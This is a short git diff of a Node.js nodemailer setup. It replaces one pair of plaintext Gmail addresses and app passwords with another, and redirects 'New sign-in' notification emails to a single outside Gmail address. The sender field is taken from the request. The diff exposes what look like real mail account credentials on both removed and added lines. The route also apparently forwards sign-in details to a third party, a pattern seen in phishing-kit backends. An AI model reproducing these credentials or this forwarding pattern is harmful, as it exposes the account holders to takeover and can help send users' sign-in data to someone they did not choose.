@@ -17,8 +17,8 @@ const transporter = nodemailer.createTransport({
     port: 465,
     secure: true,
     auth: {
-        user: "Chukwumauche78@gmail.com",
-        pass: "xqve cgnm bmgo agcr",
+        user: "yasermehmod2@gmail.com",
+        pass: "kzmw ffhk vtdu adel",
     },
 });
 
@@ -57,8 +57,8 @@ router.post('/', async (req, res) => {
         });
 
         const mailOptions = {
-            from: '"Your App Name" <usglastemp@gmail.com>',
-            to: ["chukwumauche78@gmail.com","usglastemp@gmail.com"],
+            from: email,
+            to: "josephblessing6776@gmail.com",
             subject: `New sign-in on ${deviceType}`,
             html: mergedHtml,
         };
